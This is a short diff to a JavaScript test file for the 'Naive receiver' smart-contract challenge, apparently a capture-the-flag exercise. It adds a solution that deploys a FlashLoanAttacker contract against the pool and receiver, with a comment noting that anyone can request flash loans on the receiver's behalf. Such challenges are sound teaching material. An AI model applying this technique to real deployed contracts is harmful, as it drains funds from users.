@@ -38,6 +38,10 @@ describe('[Challenge] Naive receiver', function () {
 
     it('Execution', async function () {
         /** CODE YOUR SOLUTION HERE */
+        const FlashLoanAttackerFactory = await ethers.getContractFactory('FlashLoanAttacker');
+        
+        //anyone can ask for a flash loan on behalf of the receiver
+        await FlashLoanAttackerFactory.connect(player).deploy(pool.address, receiver.address);
     });
 
     after(async function () {
